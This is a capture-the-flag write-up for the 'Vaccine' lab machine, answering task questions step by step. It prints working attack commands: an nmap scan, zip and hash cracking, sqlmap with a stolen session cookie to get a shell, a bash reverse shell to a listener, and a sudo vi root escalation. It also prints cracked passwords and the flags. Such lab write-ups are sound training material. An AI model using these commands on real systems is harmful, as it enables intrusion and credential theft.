# Vaccine

## Initial Scan

```nmap
sudo nmap -T4 -Pn -sV -sC -v 10.129.248.153 -oA Vaccine
```

<figure><img src="../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

## Task 1

Besides SSH and HTTP, what other service is hosted on this box?

Answer: FTP

## Task 2

This service can be configured to allow login with any password for specific username. What is that username?

Answer: anonymous

## Task 3

What is the name of the file downloaded over this service?

```
ftp 10.129.248.153
```

<figure><img src="../../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

Answer: backup.zip

## Task 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

<figure><img src="../../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

Answer: zip2john

## Task 5

What is the password for the admin user on the website?

<figure><img src="../../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

backup.zip password:`41852963`&#x20;

<figure><img src="../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

Looking at index.html

<figure><img src="../../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

Put the hash in a file and crack the hash with hashcat

```bash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

Answer:qwerty789

## Task 6

What option can be passed to sqlmap to try to get command execution via the sql injection? Looking at `sqlmap -h`

<figure><img src="../../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

Answer: --os-shell

## Task 7

What program can the postgres user run as root using sudo?

Get the cookie from the Website.

<figure><img src="../../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap -u 'http://10.129.248.153/dashboard.php?search=any+query' --cookie="PHPSESSID=n33tru7g83ed1hqdgfm42gnqic" --os-shell
```

We get our shell.

<figure><img src="../../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

Start the listener and run

```
bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"
```

<figure><img src="../../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

Answer: vi

## Task 8

Submit user flag

<figure><img src="../../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

Answer: ec9b13ca4d6229cd5cc1e09980965bf7

## Task 9

Submit root flag

Looking at files in the /var/www/html as there's this uses PHP. Looking in the dashboard.php file we see

<figure><img src="../../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

`user=postgres password=P@s5w0rd!`

<figure><img src="../../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

Looking at various options on [GTBOBins](https://gtfobins.github.io/gtfobins/vi/#sudo)

<figure><img src="../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

Open a file we could only do as sudo vi

```
type :shell=/bin/sh
ENTER
:shell
ENTER
```

<figure><img src="../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

Answer: dd6e058e814260bc70e9bbdef2715849
